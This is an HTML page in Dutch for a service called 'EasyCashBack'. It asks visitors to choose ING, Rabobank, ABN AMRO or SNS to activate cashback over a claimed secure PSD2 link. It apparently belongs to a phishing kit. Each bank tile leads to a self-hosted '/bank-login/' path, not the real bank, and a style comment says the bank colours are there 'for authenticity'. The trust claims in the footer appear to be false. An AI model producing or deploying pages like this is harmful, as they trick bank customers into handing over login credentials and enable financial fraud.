<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koppel je bank - EasyCashBack</title>
    <style>
        :root {
            --primary: #007bff;
            --text: #333;
            --bg: #f8f9fa;
        }
        body { 
            font-family: 'Inter', -apple-system, sans-serif; 
            background-color: var(--bg); 
            color: var(--text);
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        .header img { width: 50px; margin-bottom: 10px; }
        h1 { font-size: 22px; margin-bottom: 10px; font-weight: 700; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        
        .bank-list {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .bank-card {
            border: 1px solid #e0e0e0;
            padding: 20px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            font-weight: 600;
            font-size: 14px;
        }
        .bank-card:hover {
            border-color: var(--primary);
            background: #f0f7ff;
            transform: translateY(-2px);
        }
        .bank-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 10px;
            background: #eee;
            border-radius: 8px;
            display: flex; align-items: center; justify-content: center;
            font-size: 10px; font-weight: bold; color: #999;
        }
        /* Kleuren per bank voor echtheid */
        .ing { border-top: 4px solid #ff6200; }
        .rabo { border-top: 4px solid #000066; }
        .abn { border-top: 4px solid #00665f; }
        .sns { border-top: 4px solid #e30613; }

        .footer { margin-top: 30px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Selecteer je bank</h1>
            <p>Verbind veilig via een versleutelde PSD2-verbinding om je cashback te activeren.</p>
        </div>

        <div class="bank-list">
            <div class="bank-card ing" onclick="location.href='/bank-login/ING'">
                <div class="bank-logo" style="background: #ff6200; color: white;">ING</div>
                ING
            </div>
            <div class="bank-card rabo" onclick="location.href='/bank-login/Rabobank'">
                <div class="bank-logo" style="background: #000066; color: white;">Rabo</div>
                Rabobank
            </div>
            <div class="bank-card abn" onclick="location.href='/bank-login/ABN-AMRO'">
                <div class="bank-logo" style="background: #00665f; color: white;">ABN</div>
                ABN AMRO
            </div>
            <div class="bank-card sns" onclick="location.href='/bank-login/SNS'">
                <div class="bank-logo" style="background: #e30613; color: white;">SNS</div>
                SNS Bank
            </div>
        </div>

        <div class="footer">
            🔒 Beveiligd door EasyCashBack & Open Banking API
        </div>
    </div>
</body>
</html>
